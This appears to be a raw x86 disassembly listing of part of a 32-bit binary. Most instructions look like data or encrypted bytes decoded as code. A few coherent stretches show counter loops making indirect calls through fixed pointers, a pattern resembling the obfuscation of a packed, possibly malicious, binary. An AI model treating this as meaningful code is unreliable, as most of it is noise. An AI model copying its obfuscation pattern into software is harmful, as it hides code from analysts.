  402146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402147:	dec    eax
  402148:	push   ebx
  402149:	stos   DWORD PTR es:[edi],eax
  40214a:	xchg   edx,eax
  40214b:	pop    esp
  40214c:	inc    al
  40214e:	into   
  40214f:	push   0xffffffcd
  402151:	sti    
  402152:	adc    ebp,DWORD PTR [edx+0x71]
  402155:	mov    ebx,es
  402157:	xor    eax,0xb84c2826
  40215c:	loopne 0x402157
  40215e:	int3   
  40215f:	jnp    0x40219e
  402161:	pop    ebx
  402162:	je     0x4021b0
  402164:	jno    0x4021b5
  402166:	push   edi
  402167:	in     al,dx
  402168:	jo     0x402160
  40216a:	(bad)  
  40216b:	repz lds edi,FWORD PTR [esi+0x7dc4365]
  402172:	imul   ebx,DWORD PTR ds:0x8681754c,0x6d
  402179:	aaa    
  40217a:	in     al,0x8
  40217c:	dec    ebp
  40217d:	sub    eax,0xf8d6cd2e
  402182:	lods   eax,DWORD PTR ds:[esi]
  402183:	lahf   
  402184:	and    cl,BYTE PTR [ebp-0x1c]
  402187:	in     eax,0xf5
  402189:	pop    ebp
  40218a:	mov    ah,0x86
  40218c:	jmp    0x61f8:0xb9115516
  402193:	jbe    0x402130
  402195:	xchg   DWORD PTR [eax],edi
  402197:	out    0xa4,al
  402199:	mov    eax,ds:0x8be4311c
  40219e:	movnti DWORD PTR [ebp+0x7e],eax
  4021a2:	adc    bh,dl
  4021a4:	call   0x51766eee
  4021a9:	loope  0x402154
  4021ab:	enter  0x4107,0x5e
  4021af:	pushf  
  4021b0:	cmp    BYTE PTR [ebp-0x68b257c8],ch
  4021b6:	pop    ss
  4021b7:	dec    esi
  4021b8:	pop    ebp
  4021b9:	pop    es
  4021ba:	mov    ah,0xde
  4021bc:	dec    ebp
  4021bd:	leave  
  4021be:	clc    
  4021bf:	mov    ds:0x477aa7f0,eax
  4021c4:	push   edi
  4021c5:	mov    WORD PTR [eax+0x70467f8f],ss
  4021cb:	(bad)  
  4021cc:	clc    
  4021cd:	pop    edi
  4021ce:	pop    ss
  4021cf:	or     eax,0xae18d818
  4021d4:	call   0xbd1022a8
  4021d9:	add    ch,BYTE PTR [edx]
  4021db:	dec    edx
  4021dc:	adc    eax,0xbc9e8f65
  4021e1:	add    eax,0x9b294b4
  4021e6:	and    al,0xd2
  4021e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e9:	icebp  
  4021ea:	retf   0x41e5
  4021ed:	iret   
  4021ee:	sub    al,0x80
  4021f0:	inc    edi
  4021f1:	mov    dl,BYTE PTR [edi]
  4021f3:	stos   BYTE PTR es:[edi],al
  4021f4:	aas    
  4021f5:	inc    eax
  4021f6:	call   0xaff2b20d
  4021fb:	adc    DWORD PTR [eax+0x633cc416],ebx
  402201:	gs inc ebx
  402203:	jg     0x402262
  402205:	mov    ds:0x67c9ffe7,eax
  40220a:	mov    ds:0x55c7cb85,eax
  40220f:	sub    esp,ebp
  402211:	dec    eax
  402212:	jmp    0xd5c4:0xc4e08ebf
  402219:	pop    edx
  40221a:	push   esp
  40221b:	stc    
  40221c:	ror    DWORD PTR ds:0xbbcbf7dc,1
  402222:	mov    al,ds:0xae5b55e4
  402227:	cdq    
  402228:	dec    ecx
  402229:	xchg   esi,eax
  40222a:	inc    edi
  40222b:	retf   
  40222c:	jl     0x4021ca
  40222e:	aad    0xf7
  402230:	iret   
  402231:	pusha  
  402232:	fld    QWORD PTR [esi]
  402234:	jae    0x40224b
  402236:	retf   
  402237:	icebp  
  402238:	mov    edx,0x6a9df2a9
  40223d:	jmp    DWORD PTR [ecx+0x2dcc5b1f]
  402243:	scas   al,BYTE PTR es:[edi]
  402244:	or     al,0xb1
  402246:	lea    edi,[ebx]
  402248:	ret    0x3536
  40224b:	add    DWORD PTR [edx+0x2d],ebx
  40224e:	adc    ebx,DWORD PTR [eax+0xb00befe]
  402254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402255:	or     al,0x2d
  402257:	out    dx,eax
  402258:	(bad)  
  402259:	scas   eax,DWORD PTR es:[edi]
  40225a:	(bad)  
  40225b:	dec    ebp
  40225c:	or     dl,dh
  40225e:	xchg   si,ax
  402260:	sub    al,0x76
  402262:	shl    BYTE PTR [edi+0x73],0xbb
  402266:	pop    ds
  402267:	(bad)  
  402269:	mov    ah,0x8b
  40226b:	mov    ch,0xb3
  40226d:	(bad)  
  40226e:	jmp    0xa8219d89
  402273:	fs sub al,ch
  402276:	sahf   
  402277:	mov    bh,0x92
  402279:	jno    0x4022f0
  40227b:	mov    dl,ch
  40227d:	push   eax
  40227e:	test   BYTE PTR [esi-0x15],dh
  402281:	dec    esp
  402283:	test   DWORD PTR [edi+0x4bdcd474],esp
  402289:	push   edi
  40228a:	xchg   esp,eax
  40228b:	xlat   BYTE PTR ds:[ebx]
  40228c:	adc    ebp,DWORD PTR [edi]
  40228e:	popf   
  40228f:	add    dl,BYTE PTR [ebx-0x7c]
  402292:	sbb    al,0x3c
  402294:	pushf  
  402295:	pop    esp
  402296:	or     eax,0x355d917b
  40229b:	adc    ch,BYTE PTR [esi+0x1b]
  40229e:	stos   BYTE PTR es:[edi],al
  40229f:	les    esi,FWORD PTR [ebp+0x3e]
  4022a2:	ins    DWORD PTR es:[edi],dx
  4022a3:	and    dl,BYTE PTR [edx+0x7e27772c]
  4022a9:	sub    al,0xa8
  4022ab:	mov    edx,0x1bfc9206
  4022b0:	dec    ecx
  4022b1:	mov    ds,eax
  4022b3:	xor    DWORD PTR [ebp+0x28],ebp
  4022b6:	ss aam 0x2d
  4022b9:	dec    eax
  4022ba:	jns    0x40232f
  4022bc:	push   0x1b5d739b
  4022c1:	mov    ebx,0x28fc052a
  4022c6:	inc    ecx
  4022c7:	inc    edx
  4022c8:	addr16 nop
  4022ca:	out    dx,eax
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42edef,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42edef
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42edef,edx
  4022e3:	cmp    DWORD PTR ds:0x42edef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e9bf
  4022fe:	cmp    DWORD PTR ds:0x42edef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430441,0x1f
  402315:	cmp    DWORD PTR ds:0x430441,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430441,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e9af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430441
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430441,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	stos   DWORD PTR es:[edi],eax
  402362:	cdq    
  402363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402364:	mov    eax,0x7e7e03db
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x40236d
  40236e:	mov    ebx,0xb7e50ac
  402373:	fwait
  402374:	mov    ebp,0x9fee6c51
  402379:	shl    DWORD PTR [ebx],0xef
  40237c:	(bad)  
  40237d:	int    0x36
  40237f:	dec    eax
  402380:	inc    ebp
  402381:	shl    DWORD PTR [esi+0x7a],1
  402384:	cmp    al,0x8a
  402386:	call   0x2c34:0xd7f3407b
  40238d:	clc    
  40238e:	ja     0x402327
  402390:	in     eax,0xac
  402392:	shl    ah,0x87
  402395:	ret    0xd27f
  402398:	or     DWORD PTR [ebp+0x55057768],esp
  40239e:	mov    ebp,0x753a3f7
  4023a3:	leave  
  4023a4:	and    ebp,DWORD PTR [ecx-0x78]
  4023a7:	int3   
  4023a8:	leave  
  4023a9:	ds xor cl,bh
  4023ac:	jnp    0x4023ad
  4023ae:	jp     0x402362
  4023b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023b1:	sbb    DWORD PTR [edi],ecx
  4023b3:	jg     0x402410
  4023b5:	push   ebp
  4023b6:	cmc    
  4023b7:	(bad)
  4023ba:	jbe    0x402353
  4023bc:	dec    edi
  4023bd:	jmp    0xc45531bb
  4023c2:	xchg   esp,eax
  4023c3:	popa   
  4023c4:	(bad)  
  4023c5:	and    al,0xec
  4023c7:	rcl    dl,0x89
  4023ca:	jo     0x402427
  4023cc:	push   es
  4023cd:	xlat   BYTE PTR ds:[ebx]
  4023ce:	or     DWORD PTR ds:0x11f31d30,ecx
  4023d4:	idiv   DWORD PTR [edx]
  4023d6:	adc    DWORD PTR [edx],0xffffff9e
  4023d9:	call   0xaa94:0xcdd31e24
  4023e0:	jmp    0x118d9d04
  4023e5:	cwde   
  4023e6:	push   edi
  4023e7:	fstp   DWORD PTR [esi+eiz*1]
  4023ea:	and    ecx,DWORD PTR [ebx]
  4023ec:	sbb    dl,BYTE PTR [eax-0x571784ea]
  4023f2:	xchg   esi,eax
  4023f3:	sub    al,0x81
  4023f5:	in     al,0x25
  4023f7:	pop    esi
  4023f8:	sbb    al,0xf6
  4023fa:	cmp    BYTE PTR [edx+eiz*4-0x44a8a65d],ch
  402401:	and    ebp,DWORD PTR [ebx-0xd1340d3]
  402407:	cmp    ebx,ecx
  402409:	fcmovnb st,st(7)
  40240b:	pop    esp
  40240c:	xor    DWORD PTR [ebp+0x17],ecx
  40240f:	sbb    BYTE PTR [ebx],cl
  402411:	inc    eax
  402412:	stos   BYTE PTR es:[edi],al
  402413:	cmp    DWORD PTR [esi-0x56],esp
  402416:	jnp    0x402433
  402418:	scas   eax,DWORD PTR es:[edi]
  402419:	cld    
  40241a:	mov    bl,0xa0
  40241c:	sub    eax,0x50e92a93
  402421:	xor    esp,edi
  402423:	in     al,0xc2
  402425:	and    BYTE PTR [ebx],ch
  402427:	or     eax,0xcb56ec0c
  40242c:	mov    ds:0x8b033a68,eax
  402431:	cmp    edx,0x983757f4
  402437:	or     ch,ah
  402439:	ins    DWORD PTR es:[edi],dx
  40243a:	nop
  40243b:	test   BYTE PTR [edx],dl
  40243d:	movntq QWORD PTR [edi-0x61],mm0
  402441:	mov    ebp,0x5b1b56f8
  402446:	xchg   ebx,eax
  402447:	or     esp,DWORD PTR [esp+ebp*2-0x45fc6a39]
  40244e:	aaa    
  40244f:	xchg   edi,eax
  402450:	push   edi
  402451:	jmp    0xd90c:0x926c2c0c
  402458:	mov    eax,DWORD PTR [esi-0x23f604d8]
  40245e:	(bad)  gs:[ecx+0x7e2f4203]
  402465:	push   cs
  402466:	and    eax,0x983204e5
  40246b:	sar    ebp,0x13
  40246e:	ror    DWORD PTR [esi+ebx*2-0x1f],cl
  402472:	push   ss
  402473:	and    BYTE PTR [edi],ah
  402475:	sub    BYTE PTR [edx+0x596b98e2],bl
  40247b:	enter  0x4a7e,0xc2
  40247f:	jmp    0x8995ff96
  402484:	ja     0x402487
  402486:	adc    al,0x67
  402488:	repz pusha 
  40248a:	push   esp
  40248b:	ror    DWORD PTR [ebp+0x15],cl
  40248e:	pop    esp
  40248f:	ins    DWORD PTR es:[edi],dx
  402490:	loop   0x40241a
  402492:	dec    ebx
  402493:	inc    esp
  402494:	and    bl,BYTE PTR [eax-0x788a2f44]
  40249a:	adc    al,0x4b
  40249c:	or     BYTE PTR [ecx],dl
  40249e:	adc    BYTE PTR [edx+0x57],dh
  4024a1:	adc    bl,ch
  4024a3:	cmp    ebp,0xd4b3d1f2
  4024a9:	daa    
  4024aa:	repnz inc ebp
  4024ac:	je     0x40244d
  4024ae:	out    dx,al
  4024af:	popa   
  4024b0:	scas   al,BYTE PTR es:[edi]
  4024b1:	jle    0x40245b
  4024b3:	inc    edx
  4024b4:	jae    0x40244d
  4024b6:	mov    eax,0xdbaaeda3
  4024bb:	adc    BYTE PTR ds:0x97b16554,0x7e
  4024c2:	mov    al,ds:0x13c95f46
  4024c7:	cmp    eax,0xfe303053
  4024cc:	dec    ebp
  4024cd:	mul    ax
  4024d0:	imul   ebx,DWORD PTR [edx],0x11
  4024d3:	fcmove st,st(3)
  4024d5:	repnz shl ecx,1
  4024d8:	jae    0x40247f
  4024da:	outs   dx,DWORD PTR ds:[esi]
  4024db:	test   BYTE PTR ds:0xf6767399,cl
  4024e1:	adc    BYTE PTR [eax+0x33],ch
  4024e4:	shl    BYTE PTR [edx],1
  4024e6:	sar    DWORD PTR ds:[eax-0x3f84b128],1
  4024ed:	imul   ebx,DWORD PTR [esi-0x72],0x3640c493
  4024f4:	mov    BYTE PTR [esp+eax*4+0x18ad2c3d],ch
  4024fb:	(bad)  [eax+0x4e9fc68b]
  402501:	in     al,dx
  402502:	jmp    0x9964:0x23cc8cb4
  402509:	push   esi
  40250a:	jl     0x402523
  40250c:	hlt    
  40250d:	mov    cs,WORD PTR [edi+0x258b5080]
  402513:	and    esp,DWORD PTR [ebp-0x2848253c]
  402519:	(bad)  
  40251a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40251b:	xchg   ebp,eax
  40251c:	mov    edi,0x2808d0e7
  402521:	sub    DWORD PTR [esi+0x6a1ace27],ebp
  402527:	(bad)  
  402528:	adc    al,0x53
  40252a:	fsubp  st(1),st
  40252c:	sbb    DWORD PTR [edi-0x35],eax
  40252f:	call   0x880e6ada
  402534:	jge    0x402554
  402536:	int3   
  402537:	lea    ebp,[ebp+0x297eeb29]
  40253d:	dec    edx
  40253e:	(bad)  
  40253f:	aaa    
  402540:	mov    edi,0x2b7d336e
  402545:	jae    0x40254d
  402547:	mov    ah,0x51
  402549:	and    DWORD PTR ds:0x42edcb,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42edf3
  40255f:	xor    edx,DWORD PTR ds:0x42edcf
  402565:	mov    DWORD PTR ds:0x42edf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430465,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430445
  402592:	and    DWORD PTR ds:0x42edd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4304cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4304cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4304cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4304cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4304cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e846
  4025d7:	call   DWORD PTR ds:0x42e9c3
  4025dd:	cmp    DWORD PTR ds:0x4304cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4304cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4304cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs xchg ecx,eax
  402613:	jbe    0x402632
  402615:	inc    esp
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x40261b
  40261f:	lea    edi,[edi+0x43]
  402622:	adc    al,BYTE PTR [esi]
  402624:	and    DWORD PTR [edx],eax
  402626:	icebp  
  402627:	push   edi
  402628:	cli    
  402629:	or     bl,BYTE PTR [esi]
  40262b:	sbb    esi,DWORD PTR [eax-0x62]
  40262e:	retf   
  40262f:	or     DWORD PTR [eax-0xee0f7a0],edi
  402635:	jg     0x402633
  402637:	(bad)  
  402638:	lock push esp
  40263a:	mov    al,ds:0x60deef10
  40263f:	mov    al,ds:0xdc3e1fe2
  402644:	into   
  402645:	dec    esi
  402646:	jne    0x402607
  402648:	loopne 0x40262d
  40264a:	and    ecx,esi
  40264c:	pushf  
  40264d:	cli    
  40264e:	in     eax,0x83
  402650:	jb     0x40267e
  402652:	iret   
  402653:	aam    0x40
  402655:	cmp    al,0x50
  402657:	or     ecx,DWORD PTR [ebx]
  402659:	mov    eax,0x26d5aa16
  40265e:	cwde   
  40265f:	dec    esi
  402660:	pop    ebp
  402661:	ficom  WORD PTR [ecx-0x5bc311c6]
  402667:	shrd   DWORD PTR [esi+eiz*2-0x27],esp,0x81
  40266d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40266e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40266f:	daa    
  402670:	adc    BYTE PTR [edx-0x46],bh
  402673:	shr    ah,0xf4
  402676:	clc    
  402677:	pop    esp
  402678:	add    DWORD PTR [eax+esi*4],ebx
  40267b:	add    DWORD PTR [edi-0x2c8d0f10],eax
  402681:	out    dx,eax
  402682:	sub    ecx,ebx
  402684:	fisttp WORD PTR [esi+ebx*4-0x1f]
  402688:	cmp    edi,esi
  40268a:	or     edx,edi
  40268c:	jno    0x4026c0
  40268e:	xor    al,0xf5
  402690:	push   cs
  402691:	jae    0x402640
  402693:	jg     0x40262f
  402695:	jmp    0x402627
  402697:	fiadd  WORD PTR [ebx]
  402699:	fwait
  40269a:	lock jae 0x402715
  40269d:	(bad)  
  40269e:	loopne 0x4026dc
  4026a0:	retf   0xd347
  4026a3:	(bad)  
  4026a4:	out    0x8d,eax
  4026a6:	push   ebx
  4026a7:	and    ch,BYTE PTR [edx+0x2c]
  4026aa:	popa   
  4026ab:	mov    al,0x4f
  4026ad:	or     al,0xbc
  4026b0:	in     al,0x49
  4026b2:	out    dx,eax
  4026b3:	jne    0x402683
  4026b5:	scas   al,BYTE PTR es:[edi]
  4026b6:	xchg   ecx,eax
  4026b7:	inc    esi
  4026b8:	cmp    al,0x6b
  4026ba:	and    al,0x7e
  4026bc:	fs stos DWORD PTR es:[edi],eax
  4026be:	js     0x16255fde
  4026c4:	jne    0x40272b
  4026c6:	jnp    0x4026e6
  4026c8:	cmp    al,0xc2
  4026ca:	aad    0x49
  4026cc:	loopne 0x4026f4
  4026ce:	xchg   ebp,eax
  4026cf:	and    al,0xe5
  4026d1:	adc    al,0x1b
  4026d3:	ins    DWORD PTR es:[edi],dx
  4026d4:	call   0xc817723d
  4026d9:	aaa    
  4026da:	cmp    al,0x6f
  4026dc:	and    DWORD PTR [ecx+ebp*1],esp
  4026df:	mov    cl,0xef
  4026e1:	lea    ebp,[ebx+edx*8-0x2bfde216]
  4026e8:	and    BYTE PTR [ebx],bl
  4026ea:	imul   ebp,DWORD PTR [ebp+0xadcf1d6],0x44
  4026f1:	ja     0x4026d0
  4026f3:	pop    ebp
  4026f4:	in     eax,0x10
  4026f6:	out    0x5,al
  4026f8:	push   es
  4026f9:	mov    ch,0x43
  4026fb:	pop    edi
  4026fc:	push   0x6d
  4026fe:	in     eax,0x7b
  402700:	popf   
  402701:	xchg   ecx,eax
  402702:	or     eax,0xe07faf51
  402707:	sbb    DWORD PTR ds:[edx],eax
  40270a:	bound  ecx,QWORD PTR [esi+0x24]
  40270d:	cs icebp 
  40270f:	pop    ebp
  402710:	cli    
  402711:	test   eax,0x2d440c39
  402716:	cmc    
  402717:	imul   esi,DWORD PTR ds:0xc75e063d,0xffffff86
  40271e:	sti    
  40271f:	jno    0x402763
  402721:	or     ch,BYTE PTR gs:[esi+0x1533b7bf]
  402728:	pusha  
  402729:	aam    0x5e
  40272b:	mov    ch,0x28
  40272d:	and    dh,dh
  40272f:	retf   0x51fe
  402732:	aaa    
  402733:	out    0xb3,eax
  402735:	xchg   ecx,eax
  402736:	lahf   
  402737:	or     al,0x61
  402739:	scas   eax,DWORD PTR es:[edi]
  40273a:	stos   DWORD PTR es:[edi],eax
  40273b:	inc    ecx
  40273c:	sbb    DWORD PTR ds:0x4b9903dd,edi
  402742:	fldlg2 
  402744:	out    dx,eax
  402745:	out    0xaa,al
  402747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402748:	addr16 and al,0x2
  40274b:	adc    eax,0xdf7cf600
  402750:	xchg   ebp,eax
  402751:	cmp    dh,ah
  402753:	sub    eax,0x5a1fe650
  402758:	push   cs
  402759:	imul   ebp,DWORD PTR [edx+0x68827264],0xcb36bdb6
  402763:	mov    dh,0xb5
  402765:	shrd   DWORD PTR [esi+0x4a],edx,0x31
  40276a:	xchg   ebx,eax
  40276b:	(bad)  
  40276c:	(bad)  
  40276d:	xor    DWORD PTR [eax-0x42],0xffffff9b
  402771:	push   0xffffff90
  402773:	pop    ebx
  402774:	pop    esi
  402775:	daa    
  402776:	cmp    cl,BYTE PTR [ecx+0x573722c5]
  40277c:	mov    al,0xea
  40277e:	mov    ebp,0x9e26c6a1
  402783:	and    BYTE PTR [ebp-0x80],bh
  402786:	(bad)  
  402787:	xchg   esi,eax
  402788:	lock lahf 
  40278a:	adc    al,0x1f
  40278c:	arpl   WORD PTR [edx-0x59],si
  40278f:	test   BYTE PTR [ebp-0x3ec84183],bl
  402795:	mov    ah,0xe8
  402797:	jge    0x40279f
  402799:	jl     0x4027e5
  40279b:	push   esi
  40279c:	retf   0x10e8
  40279f:	jnp    0x402757
  4027a1:	add    eax,0x58a9a4d8
  4027a6:	cld    
  4027a7:	lods   al,BYTE PTR ds:[esi]
  4027a8:	xor    al,0xd7
  4027aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ab:	sar    edx,cl
  4027ad:	pop    ebp
  4027ae:	mov    ch,0x5b
  4027b0:	jb     0x40273a
  4027b2:	mov    gs,WORD PTR [edx]
  4027b4:	dec    ebx
  4027b5:	adc    BYTE PTR [ecx+0x4c],cl
  4027b8:	adc    al,BYTE PTR [ebx]
  4027ba:	inc    esp
  4027bb:	in     eax,0x3d
  4027bd:	lock sbb ch,BYTE PTR [ecx]
  4027c0:	mov    ch,0x9
  4027c2:	test   ebx,ebx
  4027c4:	ror    DWORD PTR [eax-0x25],0xab
  4027c8:	popa   
  4027c9:	and    esi,DWORD PTR [edx-0x5044a0a]
  4027cf:	into   
  4027d0:	sub    eax,0x96ecd461
  4027d5:	mov    BYTE PTR [ebp-0x41],0xbc
  4027d9:	add    DWORD PTR [eax+0x3499855],0x62
  4027e0:	js     0x4027a7
  4027e2:	gs je  0x402860
  4027e5:	mov    dh,0x48
  4027e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e8:	rol    esi,0x10
  4027eb:	aaa    
  4027ec:	lock cli 
  4027ee:	test   eax,0x6f242d8e
  4027f4:	stos   DWORD PTR es:[edi],eax
  4027f5:	(bad)  
  4027f6:	lds    ecx,FWORD PTR [eax-0x41]
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edx-0x73],eax
  402829:	stc    
  40282a:	mov    al,0x15
  40282c:	movd   DWORD PTR [esi+0x55],mm7
  402830:	jg     0x4028b0
  402832:	jle    0x402815
  402834:	loop   0x4028b4
  402836:	pop    es
  402837:	popa   
  402838:	jl     0x40286b
  40283a:	rcl    DWORD PTR [eax-0x7e],0xb0
  40283e:	pop    edi
  40283f:	aad    0x44
  402841:	sbb    BYTE PTR [ebx],dh
  402843:	mov    dh,dl
  402845:	add    eax,0xdd06751b
  40284a:	xchg   esp,eax
  40284b:	mov    edi,ds
  40284d:	int3   
  40284e:	xchg   esp,eax
  40284f:	ret    0x15fd
  402852:	pop    ebx
  402853:	mov    bh,0x5c
  402855:	fisttp WORD PTR [ebx+0x1975ee58]
  40285b:	fidiv  DWORD PTR [esi-0x29]
  40285e:	ror    DWORD PTR [eax+0x1f],0x3
  402862:	jb     0x402803
  402864:	iret   
  402865:	out    dx,eax
  402866:	mov    dh,0x37
  402868:	add    bl,ah
  40286a:	rep stos BYTE PTR es:[edi],al
  40286c:	dec    ecx
  40286d:	ins    DWORD PTR es:[edi],dx
  40286e:	loop   0x40284f
  402870:	shr    ebx,1
  402872:	aaa    
  402873:	mov    bl,0x93
  402875:	mov    cl,0x3f
  402877:	pop    ebx
  402878:	out    dx,al
  402879:	inc    edx
  40287a:	data16 cmc 
  40287c:	push   edi
  40287d:	dec    esi
  40287e:	in     eax,0x92
  402880:	xchg   ebp,eax
  402881:	add    eax,0x5eaf62c6
  402886:	jno    0x4028b1
  402888:	sub    edi,DWORD PTR [ebp+ebx*2-0x42a282e7]
  40288f:	cli    
  402890:	ret    
  402891:	cs xor eax,0xdbf472ab
  402897:	test   eax,0xee51f3f
  40289c:	loop   0x402919
  40289e:	test   eax,0xab6cb6ff
  4028a3:	pop    ebx
  4028a4:	mov    ah,0x4b
  4028a6:	jp     0x402906
  4028a8:	je     0x40288c
  4028aa:	or     ch,BYTE PTR [esp+edx*4-0x60]
  4028ae:	mov    ebx,0xcbfbdad0
  4028b3:	add    edx,DWORD PTR [ecx+0x629aff03]
  4028b9:	jae    0x4028dd
  4028bb:	xchg   BYTE PTR [esp+edx*4+0x7c35d994],ch
  4028c2:	inc    ebx
  4028c3:	std    
  4028c4:	add    eax,DWORD PTR [esi+0x2d5efd5d]
  4028ca:	push   eax
  4028cb:	cmp    ah,BYTE PTR [edx+0x67a68d0]
  4028d1:	in     eax,0xd4
  4028d3:	mov    edi,0x9e9df923
  4028d8:	mov    ebx,0x221f938c
  4028dd:	stos   DWORD PTR es:[edi],eax
  4028de:	int    0x25
  4028e0:	or     edx,edx
  4028e2:	add    eax,0x7f7cddcc
  4028e7:	out    0xb5,al
  4028e9:	xchg   ecx,eax
  4028ea:	imul   ebx,DWORD PTR fs:[ebp-0x4c5d6e54],0xffffffe2
  4028f2:	jge    0x40293d
  4028f4:	inc    ecx
  4028f5:	pop    edi
  4028f6:	mov    bl,0x8e
  4028f8:	(bad)  
  4028f9:	lahf   
  4028fa:	mov    ah,0x68
  4028fc:	jo     0x402936
  4028fe:	mov    al,al
  402900:	sar    DWORD PTR [ecx+ebp*2-0x38050d1],1
  402907:	xchg   DWORD PTR fs:[edx],ecx
  40290a:	push   edi
  40290b:	hlt    
  40290c:	mov    BYTE PTR [esi+ebx*2],bh
  40290f:	(bad)  
  402910:	cmc    
  402911:	adc    ecx,DWORD PTR [esi+0x781c84fe]
  402917:	dec    esp
  402918:	or     ebx,DWORD PTR [ebx+0x42b8869b]
  40291e:	jmp    0x402997
  402920:	mov    eax,ds:0x6b53e0ab
  402925:	xchg   BYTE PTR gs:[edi-0x6cc33963],bl
  40292c:	loope  0x402906
  40292e:	stos   DWORD PTR es:[edi],eax
  40292f:	pop    esi
  402930:	mov    ebp,0x7dcb7772
  402935:	imul   ecx,DWORD PTR [esi+0x54],0x5cc80866
  40293c:	stos   BYTE PTR es:[edi],al
  40293d:	or     edx,DWORD PTR [edi+eiz*1+0x17e5155c]
  402944:	mov    esi,0xe35365cc
  402949:	pop    ss
  40294a:	jno    0x402995
  40294c:	xor    DWORD PTR [ebx],edx
  40294e:	pop    esp
  40294f:	sub    eax,0x42ef9c2e
  402954:	loop   0x40293e
  402956:	xor    al,0xd5
  402958:	and    dl,BYTE PTR [eax]
  40295a:	mov    esp,0x38ac00d3
  40295f:	and    ebx,DWORD PTR [ebx]
  402961:	aas    
  402962:	stos   DWORD PTR es:[edi],eax
  402963:	sub    ebx,DWORD PTR [edi]
  402965:	push   ebp
  402966:	push   ss
  402967:	sbb    DWORD PTR [edx+0x67112c68],esi
  40296d:	or     eax,DWORD PTR [ecx+ebx*8+0x4a8540f6]
  402974:	mov    bh,0x8f
  402976:	or     ah,ah
  402978:	ret    0xd6e3
  40297b:	pop    DWORD PTR gs:[esi+0x32dbbf62]
  402982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402983:	inc    edi
  402984:	xchg   DWORD PTR [esi],ecx
  402986:	pop    es
  402987:	jecxz  0x4029ad
  402989:	sbb    edx,DWORD PTR [edi]
  40298b:	xor    DWORD PTR [edi+0xe],ebx
  40298e:	mov    al,0x74
  402990:	fucomi st,st(5)
  402992:	mov    cl,0x9b
  402994:	jge    0x4029c7
  402996:	les    esi,FWORD PTR [ebx-0x3c]
  402999:	into   
  40299a:	into   
  40299b:	scas   al,BYTE PTR es:[edi]
  40299c:	loopne 0x4029c1
  40299e:	mov    ebx,0x6b7e19f5
  4029a3:	mov    ds:0x6b7806a7,al
  4029a8:	pop    ss
  4029a9:	lock inc edx
  4029ab:	ds mov bh,0xc4
  4029ae:	add    eax,0x10cdfe74
  4029b3:	in     al,0xd8
  4029b5:	jo     0x402a1d
  4029b7:	adc    ah,bl
  4029b9:	inc    ebx
  4029ba:	cmp    al,BYTE PTR [edi+edx*1]
  4029bd:	in     eax,dx
  4029be:	pop    eax
